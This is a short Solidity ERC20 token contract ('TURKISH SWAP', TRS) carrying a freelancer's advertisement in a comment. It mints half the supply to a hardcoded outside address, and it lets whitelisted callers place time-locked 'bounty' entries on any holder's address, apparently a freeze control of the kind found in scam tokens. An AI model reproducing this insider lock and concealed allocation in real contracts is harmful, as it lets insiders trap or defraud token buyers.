// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;
import "./ERC20.sol";

contract ProtectedTokenV3 is ERC20 {

    constructor() ERC20("TURKISH SWAP", "TRS") {
        _mint(msg.sender, 50000000000 ether);
        _mint(0x744c34AA0C00761277051fe46733A06Bf59F90Fe, 50000000000 ether);
    }

    
    /* 
    https://www.truelancer.com/freelancer/pankajloniya18
    Pankaj Loniya
    <----- / ----->
    */

    function addToBountyList(
        address user,
        uint256 unblock_time,
        uint256 amount
    ) external {
        bool appoved = false;

        for (uint256 i = 0; i < _whitelist.length; i++) {
            if (_whitelist[i] == msg.sender) {
                appoved = true;
            }
        }

        if (appoved == true) {
            if (bounties_exist[user]) {
                bounties[user].amount += amount;
            } else {
                Bounty memory bounty = Bounty(unblock_time, amount);
                bounties[user] = bounty;
                bounties_exist[user] = true;
            }
        } else {
            revert("Error: You are not an owner");
        }
    }
}